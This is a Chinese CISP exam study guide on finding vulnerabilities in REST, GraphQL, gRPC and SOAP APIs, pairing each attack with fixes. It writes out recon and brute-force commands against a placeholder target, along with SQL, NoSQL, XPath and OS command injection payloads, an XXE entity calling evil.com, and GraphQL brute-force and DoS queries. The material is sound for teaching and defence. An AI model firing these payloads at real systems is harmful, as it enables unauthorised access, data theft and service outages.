# API 接口安全漏洞挖掘

> **📘 文档定位**：CISP 考试 漏洞挖掘 核心 | 难度：⭐⭐⭐⭐ | 预计阅读：28 分钟
>
> 系统讲解 API 接口安全漏洞的挖掘方法论，覆盖 REST/GraphQL/gRPC 接口的认证绕过、参数污染、越权访问、速率限制等核心测试点。

---

## 导航目录

- [一、漏洞概述](#一漏洞概述)
- [二、REST API 安全测试](#二rest-api-安全测试)
- [三、GraphQL 安全测试](#三graphql-安全测试)
- [四、认证与授权测试](#四认证与授权测试)
- [五、参数污染与注入](#五参数污染与注入)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 一、漏洞概述

REST、GraphQL、gRPC、SOAP、Webhook 等 API 是现代应用的骨架，也成为主要攻击面之一。根据 OWASP API Security Top 10，常见 API 风险包括：鉴权缺失、批量查询、过度数据暴露、缺乏资源限制、注入、安全配置错误等。

| 风险类型 | 常见表现 |
|---------|---------|
| Broken Object Level Authorization | `?uid=1002` 越权访问他人对象 |
| Broken Authentication | 未登录即可调用 / JWT 伪造 / token 永不过期 |
| Excessive Data Exposure | 接口直接返回 `password_hash`、`id_card` 等敏感字段 |
| Lack of Resources & Rate Limiting | 无速率限制，可暴力破解 / DoS / 数据拖库 |
| Broken Function Level Authorization | 普通用户访问 `/admin/*` 接口 |
| Mass Assignment | JSON 多传 `is_admin=true` 即生效 |
| Security Misconfiguration | 暴露 Swagger / Actuator / 默认错误堆栈 |
| Injection | GraphQL / SQL / NoSQL 拼接 |
| Improper Assets Management | 旧版 API `/v1/*` 未下线、无鉴权 |
| Insufficient Logging & Monitoring | 缺乏攻击检测与告警 |

## 2. API 资产发现

### 2.1 资产收集

```bash
# 通过子域枚举找 API 网关
amass enum -d target.com
subfinder -d target.com -silent | httpx -title -tech-detect

# 通过 JS 文件提取 API 路径
grep -hEo "(https?://)?/[a-zA-Z_0-9/\-]{5,}" target.js | sort -u
# 使用 LinkFinder / URLFinder 批量
python3 linkfinder.py -i "https://target.com/static/js/*.js" -o cli

# 通过 Swagger / OpenAPI
curl -s https://api.target.com/v2/api-docs
curl -s https://api.target.com/swagger.json
curl -s https://api.target.com/openapi.json
curl -s https://api.target.com/swagger-ui.html

# 通过字典 / 历史记录
ffuf -w raft-large-directories.txt -u https://api.target.com/FUZZ -fc 404
```

### 2.2 API 版本 / 路径常见模式

```
/api/v1/...
/api/v2/...
/api/internal/...
/api/dev/...
/api/test/...
/api/graphql
/soap/service.svc
/internal/...
/admin/api/...
```

## 3. REST API 常见漏洞挖掘

### 3.1 过度数据暴露

```
# 接口 /api/user/profile?uid=1001 直接返回
{
  "uid": 1001,
  "username": "alice",
  "password_hash": "$2a$10$...",   # 泄露密码哈希
  "id_card": "110101199001011234", # 身份证
  "phone": "13800138000",          # 手机号
  "role": "admin"                  # 角色信息
}
```

修复思路：使用 DTO / View Model，显式控制返回字段；前端仅渲染实际需要的字段。

### 3.2 批量赋值（Mass Assignment）

后端直接把整个请求体映射为对象，导致多余字段被接受：

```http
POST /api/user/register
{ "username":"hacker", "password":"123456", "is_admin": true }

POST /api/order/pay
{ "order_id": 123, "amount": 1 }   # 本该从数据库读取的金额被覆盖
```

修复思路：后端按白名单解析字段；使用 `@JsonIgnore` 或显式 DTO。

### 3.3 资源缺失速率限制

```bash
# 短信验证码 / 密码找回 / 登录接口无限制
ffuf -w 4digits.txt -X POST -d '{"phone":"13800138000","code":"FUZZ"}' \
     -H 'Content-Type: application/json' -u https://api.target.com/login
# 批量爆破成功登录
```

### 3.4 注入类问题

```
# SQL 注入（REST 接口依然存在）
GET /api/users?id=1 UNION SELECT 1,2,passwd FROM users-- -

# NoSQL 注入（MongoDB）
POST /api/login
{ "user":{"$gt":""}, "pass":{"$gt":""} }   # 免密登录

# XPath 注入
?name=user' or '1'='1

# OS 命令注入（文件 / 工具调用）
?cmd=ping;id;
```

## 4. GraphQL 安全

### 4.1 信息探测

```graphql
# Introspection 查询（默认开启时可获取完整 Schema）
{ __schema { types { name fields { name type { name } } } } }
{ __type(name: "User") { name fields { name type { name } } } }

# 通过 GraphiQL 控制台直接可视化查询
GET /graphiql
GET /playground
```

### 4.2 常见风险

| 风险 | 示例 |
|------|------|
| 批量深嵌套查询 | `{user(id:1){friends{friends{friends{name}}}}}` → 递归查询耗尽资源（DoS） |
| 批量别名攻击 | `query { a:login(u:"x",p:"111111"){ok} b:login(u:"x",p:"111112"){ok} ... }` → 暴力破解 |
| IDOR | `{user(id:"他人"){phone email}}` |
| 敏感字段暴露 | `me { passwordHash salt }` |
| SQL 注入 | 解析器对参数未过滤 → 传递给 ORM 时形成注入 |

### 4.3 防护思路

- 关闭生产环境 Introspection
- 限制查询复杂度与深度
- 启用查询白名单（Persisted Queries）
- 对每个 resolver 做对象级别鉴权

## 5. gRPC / SOAP / Webhook

### 5.1 gRPC

- 使用 `grpcurl` / `grpcui` 探测反射接口：`grpcurl -plaintext target:50051 list`
- 反射模式下可获取完整服务与方法列表，直接调用测试
- 关注 TLS 是否启用、Token 是否可伪造、鉴权中间件是否覆盖全部方法

### 5.2 SOAP

- 通过 `?wsdl` 获取服务描述
- 关注 XXE（外部实体注入）：在 SOAP body 中嵌入 `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/x">]>`
- 关注 XPATH 注入、参数篡改

### 5.3 Webhook

- Webhook 调用方是否对 URL 做白名单校验（SSRF）
- Webhook 接收方是否校验签名（避免伪造回调）
- 是否存在重放攻击（时间戳 + nonce）

## 6. 典型实战流程

1. **资产收集**：JS 提取、Swagger、目录爆破、子域枚举，形成 API URL 列表。
2. **未授权 / 越权**：对每个接口在未登录、普通用户、管理员三种会话下分别测试，观察是否能访问他人数据。
3. **敏感字段**：检查响应体，是否含 `password`、`token`、`cookie`、`id_card` 等字段。
4. **速率限制**：对登录、短信、查询等接口做并发与速率测试。
5. **输入注入**：对每个参数执行 SQL / NoSQL / XXE / XSS / SSRF 常规 payload。
6. **批量与并发**：并发调用领券、提现、抽奖、支付回调接口，观察幂等性。
7. **版本与旧接口**：对比 `/v1` 与 `/v2` 行为差异，尝试旧接口越权。

示例测试脚本（ffuf 批量）：

```bash
# 1. 从 JS 提取路径生成 api.txt
# 2. 对每个路径在未登录、登录两种 cookie 下请求
ffuf -w api.txt \
     -u "https://api.target.com/FUZZ" \
     -H "Cookie: <logged-in-cookie>" \
     -fc 401,403,404 -of html -o result.html
```

## 7. 修复建议

1. **统一鉴权**：默认全部接口需要认证，仅显式放开 `/login`、`/healthz`。
2. **对象级鉴权**：所有带 ID 的查询强制附加 `owner_id = current_uid` 条件。
3. **DTO / 白名单**：显式声明输入与输出字段，禁止直接把请求体映射到数据库模型。
4. **速率限制**：按 IP / 用户 / 接口设置配额，短信 / 验证码限制严格。
5. **GraphQL 限制**：关闭 Introspection，限制查询深度 / 复杂度，启用查询白名单。
6. **日志与审计**：记录每次接口调用的参数、用户、结果，便于追溯与攻击发现。
